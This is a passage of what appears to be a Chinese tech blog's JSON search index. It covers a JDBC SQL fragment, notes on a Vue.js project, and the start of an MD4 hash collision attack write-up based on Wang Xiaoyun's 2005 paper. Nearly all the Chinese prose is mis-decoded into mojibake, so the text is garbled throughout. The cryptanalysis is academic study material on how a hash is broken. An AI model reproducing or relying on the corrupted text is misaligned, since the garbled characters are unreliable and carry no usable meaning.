\" + \"group by d.id;\"; stmt.execute(sql); */ sql= \"select d.givenNames, d.familyName as name\" + \"from nDirected nd join Directors d on (nd.director = d.id","date":"2019-03-25","objectID":"/jdbc-mysql/:6:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["å‰ç«¯"],"content":"å…¶å®æœ€å¤§çš„å¿ƒå¾—æ˜¯ä¸è¦ä¸€æ¬¡å¼€å¤šä¸ªé¡¹ç›®ã€‚ åœ¨è¿™æ¬¡çš„ â€œè€æœ‰æ‰€å¾—â€ é¡¹ç›®ä¸­ï¼Œæˆ‘ä¸»è¦è´Ÿè´£é¡¹ç›®ä¸­å‰åç«¯é€šè®¯éƒ¨åˆ†çš„å¼€å‘ã€‚æˆ‘ä»¬å›¢é˜Ÿéµå¾ªå‰åç«¯åˆ†ç¦»çš„å¼€å‘åŸåˆ™ï¼Œå› æ­¤åœ¨å‰ç«¯å¼€å‘æ—¶æˆ‘æ— éœ€äº†è§£å¤ªå¤šåç«¯çš„å®ç°ç»†èŠ‚ï¼Œåªéœ€è¦æŒæ¡åç«¯æä¾›çš„ API çš„åŠŸèƒ½ä¸ç‰¹æ€§ã€‚è¿™ä¸€å¼€å‘åŸåˆ™æ— ç–‘å¤§å¤§æé«˜äº†æ•´ä¸ªé¡¹ç›®å¼€å‘è¿‡ç¨‹çš„å¹¶è¡Œåº¦ï¼Œä¹Ÿç®€åŒ–äº†æˆ‘çš„å·¥ä½œã€‚ é¡¹ç›®åç«¯éƒ¨ç½²åœ¨ CentOS æœåŠ¡å™¨ä¸Šï¼Œå‰ç«¯é€šè¿‡è®¿é—®æœåŠ¡å™¨ç‰¹å®šç«¯å£çš„ç‰¹å®š url æ¥å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚ä¾‹å¦‚ç™»å½•è¯·æ±‚ï¼š http://\u003cserver_ip\u003e:8080/signIn?username=uname\u0026password=pwd ä¼—æ‰€å‘¨çŸ¥ï¼Œç½‘ç»œè¯·æ±‚å‘ç”Ÿé”™è¯¯æ˜¯ååˆ†å¸¸è§çš„ï¼Œåç«¯å‡ºç°å¼‚å¸¸ä¹ŸåŒæ ·æ˜¯å®¶å¸¸ä¾¿é¥­ï¼Œå› æ­¤ï¼Œä¸ºäº†åœ¨æ•°æ®è·å–å‡ºé”™æ—¶åŠæ—¶å®šä½é—®é¢˜ï¼Œæˆ‘åˆ©ç”¨ Postman æ¥æ¨¡æ‹Ÿå¯¹æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ“ä½œä»¥æ£€æŸ¥è¿”å›çš„æ•°æ®ï¼Œå¹¶åˆ©ç”¨ Navicat æ£€æŸ¥æ•°æ®åº“å†…çš„æ•°æ®æ˜¯å¦åŠæ—¶æ›´æ–°ï¼Œä»¥åŠå¯¹æ•°æ®åº“è¿›è¡Œä¿®æ”¹ã€‚åˆ©ç”¨å¥½è¿™ä¸¤ä¸ªè½¯ä»¶æå¤§åœ°æé«˜äº†è°ƒè¯•é”™è¯¯çš„æ•ˆç‡ã€‚ å‘åç«¯å‘é€çš„è¯·æ±‚é€šå¸¸æ˜¯ HTTP/POST æ–¹æ³•çš„å¼‚æ­¥è¯·æ±‚ï¼Œè¿™å°±è¦ç”¨åˆ° AJAX æŠ€æœ¯ï¼ˆå®é™…ä¸Šè·å–æ•°æ®é€šå¸¸é‡‡ç”¨ JSON æ ¼å¼è€Œä¸æ˜¯ XMLï¼‰ã€‚å¼‚æ­¥è¯·æ±‚æé«˜äº†åº”ç”¨çš„æ€§èƒ½ï¼Œä½†æ˜¯å´ä¼šå¸¦æ¥è¢«æˆç§°ä¸º â€œå›è°ƒåœ°ç‹±â€ï¼ˆcallback hellï¼‰çš„é—®é¢˜â€”â€”ç”±äºå¼‚æ­¥è¯·æ±‚çš„åŸç†ï¼Œè¿”å›çš„æ•°æ®éƒ½æ˜¯ç”±å›è°ƒå‡½æ•°æ¥å¤„ç†ï¼Œåœ¨ä»£ç ä¸­å›è°ƒå‡½æ•°å¸¸å¸¸ä¼šåµŒå¥—å¾ˆå¤šå±‚ï¼Œä½¿å¾—ä»£ç éå¸¸éš¾ç»´æŠ¤å’Œç†è§£ã€‚æœ¬é¡¹ç›®ä¸­æˆ‘ä¸»è¦é€šè¿‡å°†å‡½æ•°æ¨¡å—åŒ–çš„åŠæ³•è§£å†³è¿™ä¸€é—®é¢˜ã€‚ å¦ä¸€ä¸ªå·¨å¤§çš„ã€è€Œåˆææ˜“è¢«å¿½è§†çš„é—®é¢˜æ˜¯ï¼šå›è°ƒå‡½æ•°ä¸ js ä¸­çš„ä¸»å‡½æ•°çš„æ‰§è¡Œæ˜¯ç±»ä¼¼å¹¶è¡Œçš„ï¼Œè¿™ä½¿å¾—åœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹å˜é‡çš„å€¼å¯èƒ½ä¼šæ»åï¼Œæˆ–è€…è¯´è¿Ÿäºæˆ‘ä»¬æœŸæœ›çš„æ—¶é—´ã€‚è¿™ä¸€é—®é¢˜ååˆ†å±é™©è€Œéšè”½ï¼Œå› æ­¤æˆ‘é€šå¸¸éƒ½åœ¨å›è°ƒå‡½æ•°å†…éƒ¨å®Œæˆéœ€è¦ç”¨åˆ°è¢«ä¿®æ”¹å˜é‡çš„æ“ä½œã€‚ æœ€åå€¼å¾—ä¸€æçš„å°±æ˜¯ Vue.js ä¸­çš„æ•°æ®ç»‘å®šé—®é¢˜ï¼Œè¿™ç±»é—®é¢˜ä¹Ÿæ˜¯è€—è´¹æˆ‘æ—¶é—´æœ€ä¹…çš„ä¸€ç±»ã€‚é¦–å…ˆï¼Œåœ¨ Vue.js ä¸­é€šè¿‡ç´¢å¼•ç»™æ•°ç»„å…ƒç´ èµ‹å€¼æ˜¯æ— æ³•è§¦å‘è§†å›¾æ›´æ–°çš„ã€‚å› æ­¤æˆ‘ä¸»è¦ä½¿ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹å¼æ›´æ–°æ•°ç»„ï¼š this.listData.push(ret.data[item]); // 1 this.$set(this.replyTime, item, this.$calcTime(ret.data[item].creatime.time)); // 2 å¯¹äºäºŒç»´æ•°ç»„çš„æ›´æ–°ï¼Œé‡‡ç”¨è¿™ç§è¾ƒä¸ºéº»çƒ¦çš„å˜ä½“ï¼š const temp_list = this.listData[val].slice(0); for (let item in ret.data) { temp_list.push(ret.data[item]); } this.$set(this.listData, val, temp_list); å…¶æ¬¡ï¼Œè¯¸å¦‚ Mustache å†…éƒ¨å’Œ v-bind ç³»åˆ—çš„æ•°æ®ç»‘å®šä¸­ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨å‡½æ•°çš„è¿”å›å€¼ï¼Œè¿™ä¸€é—®é¢˜å›°æ‰°äº†æˆ‘éå¸¸ä¹‹ä¹…ï¼Œæœ€åé€šè¿‡ä½¿ç”¨æ•°ç»„å…ƒç´ ç»‘å®šï¼Œå¹¶é€šè¿‡å‡½æ•°è·å–æ•°ç»„å†…æ•°æ®çš„æ–¹å¼ç»•è¿‡äº†è¿™ä¸€é™åˆ¶ã€‚ æœ€åï¼Œv-if ä¸ v-for åœ¨åŒä¸€èŠ‚ç‚¹ä¸­å‡ºç°æ—¶ï¼Œv-for ä¼˜å…ˆçº§æ›´é«˜ï¼Œå¯ä»¥æŠŠ v-if æ”¾åœ¨çˆ¶èŠ‚ç‚¹ä¸Šæ¥é¿å…è¿™ç§æƒ…å†µï¼›åµŒå¥— v-for æ—¶ï¼ŒèŠ‚ç‚¹çš„ :key å±æ€§å¿…é¡»ä¸¤ä¸¤ä¸åŒã€‚ æœ¬é¡¹ç›®ä¸­ï¼Œæˆ‘å­¦ä¹ äº†æ–°çš„å‰ç«¯æ¡†æ¶ uni-app å’Œ Vue.jsï¼Œå°½ç®¡å„æœ‰ä¸€å®šä¸è¶³ï¼Œæˆ‘ä¾ç„¶è®¤ä¸ºä¸¤è€…ä¸ºé¡¹ç›®å¼€å‘æä¾›äº†ä¸å°‘ä¾¿åˆ©ï¼›è€Œåœ¨ç•Œé¢å¸ƒå±€ä¸è®¾è®¡ä¸Šï¼Œæˆ‘å¹¶æ²¡æœ‰å¤ªå¤šè´¡çŒ®ï¼Œä¸è¿‡åœ¨è¿›è¡Œè°ƒæ•´æ—¶ä½¿ç”¨åˆ°äº† flex å¸ƒå±€ï¼Œç®—æ˜¯æ¯”è¾ƒå¤§çš„æ”¶è·ã€‚ ","date":"2019-03-18","objectID":"/adminder/:0:0","tags":["é¡¹ç›®"],"title":"â€œè€æœ‰æ‰€å¾—â€ é¡¹ç›®å®è·µå¿ƒå¾—","uri":"/adminder/"},{"categories":["å¯†ç å­¦"],"content":"é‡å¤äº†ç‹å°äº‘æ•™æˆ 14 å¹´å‰çš„å·¥ä½œï¼ŒRIPEMD/MD5/SHA å®¶æ—ç¢°æ’åŸç†ç±»ä¼¼ã€‚ è¯¾ç¨‹ã€ŠHash å‡½æ•°å®‰å…¨æ€§åˆ†æã€‹è¦æ±‚æˆ‘ä»¬åŸºäºç‹å°äº‘æ•™æˆåœ¨ 2005 å¹´æ¬§å¯†ä¼šä¸Šå‘è¡¨çš„ Cryptanalysis of the Hash Functions MD4 and RIPEMDï¼Œå®ç°å¯¹ MD4 å‡½æ•°çš„ç¢°æ’æ”»å‡»ã€‚æ‰€è°“ MD4 å‡½æ•°ï¼Œå°±æ˜¯å¤§åé¼é¼çš„ MD5 å‡½æ•°çš„å‰èº«ï¼Œåè€…ç›¸è¾ƒäºå‰è€…æ›´ä¸ºå®‰å…¨ï¼ˆå°½ç®¡ä¹ŸåŒæ ·è¢«ç‹å°äº‘æ•™æˆæ‰¾åˆ°äº†ç¢°æ’æ”»å‡»çš„æ–¹æ³•ï¼‰ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒMD4 å’Œ MD5 çš„å‘æ˜è€…æ˜¯ Ronald Rivestï¼Œä¹Ÿå°±æ˜¯ RSA ä¸­çš„â€˜Râ€™ã€‚ æœ¬æ–‡å¯ä»¥çœ‹ä½œæ˜¯å¯¹è¿™ç¯‡è‘—åè®ºæ–‡çš„ä¸­æ–‡æ¦‚è¿°ï¼Œå…¶ä¸­æ··æ‚äº†ä¸€äº›ä¸ªäººåœ¨æ„ç­‘ä»£ç æ—¶çš„ç®€ç•¥æ€è·¯ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:0:0","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"MD4 ç®—æ³•ä»‹ç» MD4 æ˜¯å°†ä»»æ„é•¿åº¦çš„æ¶ˆæ¯å‹ç¼©ä¸º 128bit çš„ä¸€ç§å•å‘æ•£åˆ—å‡½æ•°ã€‚MD4 å…ˆå°†æ¶ˆæ¯å¡«å……è‡³å…¶é•¿åº¦ä¸º 512bit çš„æ•´æ•°å€ï¼ˆå³ä½¿æ¶ˆæ¯åŸé•¿å·²ç»æ˜¯ 512bit çš„æ•´æ•°å€ï¼‰ï¼Œéšåå°†å¡«å……åçš„æ¶ˆæ¯å‹ç¼©è‡³ 128bitã€‚ç”±äºå¡«å……æ¶ˆæ¯çš„æ–¹æ³•ä¸ MD4 ç¢°æ’æ— å…³ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæˆ‘ä»¬åªå…³æ³¨å‹ç¼©æ¶ˆæ¯çš„æ–¹æ³•ã€‚ ä¸ºäº†é˜é‡Š MD4 å‹ç¼©å‡½æ•°çš„æ­¥éª¤ï¼Œé¦–å…ˆå®šä¹‰ä¸‰ä¸ªå‡½æ•°ï¼š $$ F(X,Y,Z) = (X\\land Y)\\lor (\\lnot X\\land Z) $$ $$ G(X,Y,Z) = (X\\land Y)\\lor (X\\land Z)\\lor (Y\\land Z) $$ $$ H(X,Y,Z) = X\\oplus Y\\oplus Z $$ å…¶ä¸­ X,Y,Z éƒ½æ˜¯ 32bit çš„å­—ï¼ˆæ³¨æ„åˆ°åœ¨ C++ ä¸­ï¼Œunsigned int å¯ä»¥å¾ˆå¥½åœ°è¡¨ç¤ºå®ƒä»¬ï¼‰ã€‚å‹ç¼©å‡½æ•°å…± 3 è½®ï¼Œæ¯è½®æœ‰ 16 æ­¥æ“ä½œï¼Œæ¯æ¬¡æ“ä½œéƒ½ä¼šæ›´æ–°é“¾æ¥å˜é‡ a,b,c,d ä¹‹ä¸€ã€‚æ›´æ–°æ—¶éœ€è¦ç”¨åˆ°è¿™ä¸‰ä¸ªå‡½æ•°ï¼š $$ \\phi_0(a,b,c,d,m_k,s) = ((a + F(b,c,d) + m_k)\\ mod\\ 2^{32})\\lll s $$ $$ \\phi_1(a,b,c,d,m_k,s) = ((a + G(b,c,d) + m_k + 0x5a827999)\\ mod\\ 2^{32})\\lll s $$ $$ \\phi_2(a,b,c,d,m_k,s) = ((a + H(b,c,d) + m_k + 0x6ed9eba1)\\ mod\\ 2^{32})\\lll s $$ è€Œ a,b,c,d çš„åˆå§‹å€¼å®šä¹‰ä¸ºï¼š $$ (a,b,c,d) = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) $$ è¿™é‡Œçš„ 4 ä¸ª 16 è¿›åˆ¶æ•°ï¼Œä»¥åŠä¸Šé¢ $\\phi_1$ å’Œ $\\phi_2$ å¼ä¸­çš„ 2 ä¸ª 16 è¿›åˆ¶æ•°ï¼Œéƒ½æ˜¯å¯ä»¥ä»»æ„é€‰å–çš„ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:1:0","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"MD4 å‹ç¼©å‡½æ•° è®°å¡«å……åçš„æ¶ˆæ¯ä¸º $\\bar{M}$ï¼Œå¯¹ $\\bar{M}$ ä¸­çš„ä»»ä¸€ 512bit å— $M$ï¼Œå°†å…¶åˆ’åˆ†ä¸º 16 ä¸ª 32bit å­— $(m_0, m_1, â€¦, m_{15})$ã€‚åŒæ—¶ï¼Œå®šä¹‰ $(aa,bb,cc,dd)$ ä¸ºé“¾æ¥å˜é‡ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€æ¶ˆæ¯å—ç»è¿‡å‹ç¼©åçš„è¾“å‡ºï¼Œæˆ–è€…è¯´å‹ç¼©æœ¬æ¶ˆæ¯å—æ‰€ç”¨åˆ°çš„è¾“å…¥ã€‚åœ¨ç¬¬ä¸€è½®ï¼Œé“¾æ¥å˜é‡çš„å€¼å°±æ˜¯ä¸Šè¿° a,b,c,d çš„åˆå§‹å€¼ã€‚ å‹ç¼©å‡½æ•°çš„ä¸»ä½“æ˜¯ä¸‰è½®ï¼Œæˆ–è€…è¯´ 48 æ­¥è¿ç®—ï¼š $$ \\text{For\\ j = 0,1,2\\ and\\ i = 0,1,2,3} $$ $$ a = \\phi_j(a,b,c,d,w_{j,4i},s_{j,4i}) $$ $$ d = \\phi_j(d,a,b,c,w_{j,4i+1},s_{j,4i+1}) $$ $$ c = \\phi_j(c,d,a,b,w_{j,4i+2},s_{j,4i+2}) $$ $$ b = \\phi_j(b,c,d,a,w_{j,4i+3},s_{j,4i+3}) $$ è¿™é‡Œçš„ w æ˜¯æ¶ˆæ¯å­—ï¼Œs æ˜¯å¾ªç¯å·¦ç§»çš„ä½æ•°ã€‚å‹ç¼©å‡½æ•°çš„æœ€åä¸€æ­¥æ„å¤–ç®€å•ï¼Œå°†è®¡ç®—å¾—åˆ°çš„é“¾æ¥å˜é‡ a,b,c,d åŠ åˆ°è¾“å…¥çš„é“¾æ¥å˜é‡ aa,bb,cc,dd ä¸Šï¼š $$ aa = (a + aa)\\ mod\\ 2^{32} $$ $$ bb = (b + bb)\\ mod\\ 2^{32} $$ $$ cc = (c + cc)\\ mod\\ 2^{32} $$ $$ dd = (d + dd)\\ mod\\ 2^{32} $$ å¦‚æœè¿™é‡Œçš„ $M$ æ˜¯æœ€åä¸€ä¸ªæ¶ˆæ¯å—ï¼Œé‚£ä¹ˆ $H(\\bar{M}) = aa|bb|cc|dd$ï¼Œå¦åˆ™ç”¨ $(aa,bb,cc,dd)$ ä½œä¸ºä¸‹ä¸€ä¸ªæ¶ˆæ¯å—çš„è¾“å…¥é“¾æ¥å˜é‡ã€‚ æ³¨æ„åˆ°è¿™é‡Œçš„å››ä¸ªè¡¨è¾¾å¼å’Œä¸Šé¢çš„ä¸‰ä¸ª $\\phi$ ç³»åˆ—è¡¨è¾¾å¼éƒ½å«æœ‰ $mod\\ 2^{32}$ è¿™ä¸ªç‰¹æ®Šçš„æ¨¡è¿ç®—ã€‚ä» 01 ä¸²çš„è§’åº¦çœ‹ï¼Œè¿™ä¸ªè¿ç®—ç›¸å½“äºæˆªå–è¯¥ä¸²çš„ä½ 32 ä½ã€‚è€Œç”±ä¸Šè¿°åˆ†ææˆ‘ä»¬å·²çŸ¥ï¼Œå‚ä¸è¿ç®—çš„ a,b,c,dã€F/G/H å‡½æ•°çš„è¾“å‡ºã€ä»¥åŠ $m_k$ éƒ½æ˜¯ 32bit çš„ 01 ä¸²ï¼Œæˆ–è€…è¯´ unsigned intã€‚è¿™æ„æˆäº†ä¸€ä¸ªç¾å¦™çš„å·§åˆï¼Œé‚£å°±æ˜¯ï¼šåœ¨åˆ©ç”¨ unsigned int è¿›è¡Œå››åˆ™è¿ç®—æ—¶é»˜è®¤è‡ªåŠ¨ä¸¢å¼ƒæº¢å‡ºçš„ä½ï¼Œè€Œè¿™ä¸ $mod\\ 2^{32}$ çš„æ•ˆæœå®Œå…¨ä¸€è‡´ï¼ å½“ç„¶ï¼Œå®é™…ä¸Šè¿™å¹¶ä¸æ˜¯å·§åˆã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:1:1","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"å¼•ç†ä¸è®°å· ä¸‹é¢ç»™å‡ºçš„å®šç†éƒ½åªæ¶‰åŠä½è¿ç®—ï¼Œé€»è¾‘ååˆ†ç®€å•ï¼Œå´æ˜¯åé¢æ¨å¯¼å……åˆ†æ¡ä»¶çš„å…³é”®æ‰€åœ¨ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:2:0","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"F å‡½æ•°å¼•ç† $$ F(x,y,z) = F(\\lnot x,y,z)\\ iff\\ y=z $$ $$ F(x,y,z) = F(x,\\lnot y,z)\\ iff\\ x=0 $$ $$ F(x,y,z) = F(x,y,\\lnot z)\\ iff\\ x=1 $$ ","date":"2019-03-06","objectID":"/md4-collision/:2:1","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"G å‡½æ•°å¼•ç† $$ G(x,y,z) = G(\\lnot x,y,z)\\ iff\\ y=z $$ $$ G(x,y,z) = G(x,\\lnot y,z)\\ iff\\ x=z $$ $$ G(x,y,z) = G(x,y,\\lnot z)\\ iff\\ x=y $$ ","date":"2019-03-06","objectID":"/md4-collision/:2:2","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"H å‡½æ•°å¼•ç† $$ H(x,y,z) = \\lnot H(\\lnot x,y,z) = \\lnot H(x,\\lnot y,z) = \\lnot H(x,y,\\lnot z) $$ $$ H(x,y,z) = H(\\lnot x,\\lnot y,z) = H(x,\\lnot y,\\lnot z) = H(\\lnot x,y,\\lnot z) $$ ","date":"2019-03-06","objectID":"/md4-collision/:2:3","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"è®°å· ä¸‹æ–‡ä¸­åªæœ‰ä¸€ä¸ªè®°å·æ˜¯ä¸æ€ä¹ˆå¸¸è§çš„ï¼Œé‚£å°±æ˜¯ $x_i[\\pm j_1,\\pm j_2,â€¦,\\pm j_l]$ï¼Œå®ƒè¡¨ç¤ºæ”¹å˜ $x_i$ çš„ç¬¬ $j_1,j_2,â€¦,j_l$ ä½åå¾—åˆ°çš„ 01 ä¸²ã€‚æ­£å·è¡¨ç¤ºå°†è¯¥ä½ä» 0 å˜æˆ 1ï¼Œè´Ÿå·ç›¸åã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:2:4","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"ç­‰ä»·è½¬æ¢æ–¹æ³• åœ¨åŸæ–‡ä¸­ï¼Œä¸ºäº†è¯´æ˜è¿™ç§æ–¹æ³•ä½œè€…ä¸¾äº†ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¯¹äºï¼š $$ \\Delta c_2 = c_2â€™- c_2 = -2^{18} + 2^{21} $$ ç”¨åˆšæ‰çš„è®°å·è¡¨ç¤ºï¼Œå°±æ˜¯ $c_2â€™= c_2[-19,22]$ã€‚åœ¨ä¸€äº›ç‰¹å®šçš„å·®åˆ†è·¯å¾„ä¸Šéœ€è¦å°†å…¶ä¸­çš„å• bit å·®åˆ†æ‰©å±•æˆå¤š bit å·®åˆ†ï¼Œè¿™å°±éœ€è¦ä¸€ç§ç­‰ä»·è½¬æ¢æ–¹æ³•ã€‚æ˜¾ç„¶è¿™é‡Œ $-2^{18}=2^{18}+2^{19}-2^{20}$ï¼Œä¹Ÿå°±æ˜¯è¯´ $c_2[-19] = c_2[19,20,-21]$ã€‚ç»¼ä¸Šï¼š $$ c_2â€™= c_2[19,20,-21,22] $$ ","date":"2019-03-06","objectID":"/md4-collision/:2:5","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"MD4 ç¢°æ’æ”»å‡» æ”»å‡»åˆ†ä¸ºä¸‰æ­¥ï¼š æ„é€ ä¸€å¯¹å·®åˆ† M ä¸ M' ç”±æ­¤ç”Ÿæˆå……åˆ†æ¡ä»¶ å¯¹éšæœºæ¶ˆæ¯ M è¿›è¡Œä¿®æ”¹æ¥å°½å¯èƒ½æ»¡è¶³ä¹‹å‰çš„å……åˆ†æ¡ä»¶ ","date":"2019-03-06","objectID":"/md4-collision/:3:0","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"å·®åˆ†æ„é€ ä¸å……åˆ†æ¡ä»¶æ¨å¯¼ æ„é€  M ä¸ Mâ€™ï¼Œä½¿å¾—ï¼š $$ \\Delta M = Mâ€™- M = (\\Delta m_0, \\Delta m_1, â€¦, \\Delta m_{15}) $$ $$ \\Delta m_1 = 2^{31},\\ \\ \\Delta m_2 = 2^{31}-2^{28},\\ \\ \\Delta m_{12} = -2^{16} $$ $$ \\Delta m_i = 0,\\ \\ 0\\le i\\le 15,\\ \\ i\\ne 1,2,12 $$ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ç¢°æ’å·®åˆ†ï¼Œå¹¶æ ¹æ® F/G/H å‡½æ•°çš„ä¸Šè¿°å¼•ç†ï¼Œç”Ÿæˆä½¿å¾—å·®åˆ†æ€§è´¨èƒ½å¤Ÿè¢«æ»¡è¶³çš„ä¸€ç³»åˆ—å……åˆ†æ¡ä»¶ã€‚åªéœ€è¦å°½å¯èƒ½ä¿è¯è¿™äº›å……åˆ†æ¡ä»¶æˆç«‹ï¼Œå³å¯å¤§å¹…æé«˜äº§ç”Ÿç¢°æ’çš„æ¦‚ç‡ã€‚åœ¨è®ºæ–‡ä¸­ï¼Œä½œè€…åœ¨è¡¨ 5 ä¸­ç»™å‡ºäº†ç¢°æ’å·®åˆ†çš„ç‰¹å¾ï¼Œåœ¨è¡¨ 6 ä¸­ç»™å‡ºäº†æ‰€æœ‰å……åˆ†æ¡ä»¶ï¼Œç”±äºè¡¨æ ¼è¾ƒé•¿è¿™é‡Œä¸å†æ¬è¿ã€‚ ä½œè€…ä¸¾äº†ä¸€ä¸ªè¯¦ç»†çš„ä¾‹å­æ¥è¯´æ˜ï¼Œæˆ‘ä»¬å¦‚ä½•ç”Ÿæˆè¿™æ ·çš„å……åˆ†æ¡ä»¶ã€‚ å¯¹äºå¦‚ä¸‹å˜æ¢ï¼ˆè¡¨ 5 ä¸­çš„ç¬¬ 9 æ­¥ï¼‰ï¼š $$ (b_2[-13,-14,15], c_2[19,20,-21,-22], d_2[14], a_2) $$ $$ \\to (a_3[17], b_2[-13,-14,15], c_2[19,20,-21,22], d_2[14]) $$ æˆ‘ä»¬å·²ç»çŸ¥é“ï¼š $$ a_3 = ((a_2 + F(b_2, c_2, d_2) + m_8)\\ mod\\ 2^{32}) \\lll 3 $$ ç”±F å‡½æ•°å¼•ç† 1ï¼Œä¸ºäº†è®© $b_2$ ç¬¬ 13 ä½å’Œ 15 ä½ä¸Šçš„å˜åŒ–ä¸å½±å“ $a_3$ï¼Œæˆ‘ä»¬å¯ä»¥ä»¤ $c_2$ å’Œ $d_2$ åœ¨ç¬¬ 13 å’Œ 15 ä½ä¸Šç›¸ç­‰ã€‚ ç”±F å‡½æ•°å¼•ç† 2ï¼Œä¸ºäº†è®© $c_3$ ç¬¬ 19-22 ä½ä¸Šçš„å˜åŒ–ä¸å½±å“ $a_3$ï¼Œæˆ‘ä»¬å¯ä»¥ä»¤ $b_2$ ç¬¬ 19-22 ä½å…¨éƒ¨ä¸º 0ã€‚ ç”± F å‡½æ•°æ€§è´¨ï¼Œæ„é€  $b_{2,14}=1, d_{2,14}=0, c_{2,14}=0$ï¼Œè¿™æ ·å½“ $b_2$ å’Œ $d_2$ çš„ç¬¬ 14 ä½åˆ†åˆ«ç”± 1 å˜ 0 å’Œç”± 0 å˜ 1 æ—¶ï¼ˆ $c_2$ ä¸å˜ï¼‰ï¼ŒF å‡½æ•°è¿”å›å€¼å°±ä¼šç”± 0 å˜ 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ$F(b_{2,14}, c_{2,14}, d_{2,14}) = 0, F(\\lnot b_{2,14}, c_{2,14}, \\lnot d_{2,14}) = 1$ï¼Œå†æŠŠç›¸åº”çš„ iã€j å’Œç§»ä½ï¼ˆæ ¹æ®è¡¨ 5ï¼Œç¬¬ 9 æ­¥çš„ç§»ä½ä¸º 3ï¼‰ä»£å…¥å‹ç¼©å‡½æ•°çš„ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œå°±å¯ä»¥å¾—åˆ° $\\Delta a_3 = 2^{16}$ã€‚ æˆ‘ä»¬æœ€åä»¤ $a_3$ ç¬¬ 17 ä½ä¸º 0ï¼Œå°±å¯ä»¥å¾—åˆ° $a_3â€™= a_3[17]$ã€‚ äºæ˜¯ä¸Šè¿° 10 ä¸ªæ¡ä»¶è¶³å¤Ÿä¿è¯ç¬¬ 9 æ­¥çš„å·®åˆ†æ€§è´¨æˆç«‹ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ 10 ä¸ªæ¡ä»¶æ˜¯ç¬¬ 9 æ­¥çš„å……åˆ†æ¡ä»¶ã€‚å…¶ä½™æ¯æ­¥çš„å……åˆ†æ¡ä»¶çš„æ¨å¯¼éƒ½ç±»ä¼¼ã€‚ ","date":"2019-03-06","objectID":"/md4-collision/:3:1","tags":["Hash","ä½è¿ç®—","C/C++"],"title":"çŸ­å…µç›¸æ¥ï¼šMD4 ç¢°æ’æ”»å‡»","uri":"/md4-collision/"},{"categories":["å¯†ç å­¦"],"content":"æ¶ˆæ¯ä¿®æ”¹ å¦‚æœæ²¡æœ‰æ¶ˆæ¯ä¿®æ”¹ï¼Œè¦è®© M ä¸ Mâ€™ ç¢°æ’åªæœ‰ $2^{-122}$ çš„æ¦‚ç‡ï¼Œè¿˜è¿œè¿œä¸å¦‚ç”Ÿæ—¥æ”»å‡»çš„ $2^{64}$ï¼Œå› æ­¤ä½œè€…æå‡ºé€šè¿‡æ¶ˆæ¯ä¿®æ”¹æ¥å°½å¯èƒ½å¤šæ»¡è¶³ä¸€äº›å……åˆ†æ¡ä»¶ï¼Œæå‡ç¢°æ’æ¦‚ç‡ã€‚ å¤šæ­¥æ¶ˆæ¯ä¿®æ”¹çš„æœ¬è´¨åœ¨äºåˆ©ç”¨å•æ­¥æ¶ˆæ¯ä¿®æ”¹ï¼Œæ»¡è¶³å°½å¯èƒ½å¤šçš„å……åˆ†æ¡ä»¶è€Œä¸ç ´åå·²æ»¡è¶³çš„é‚£äº›æ¡ä»¶ã€‚å› 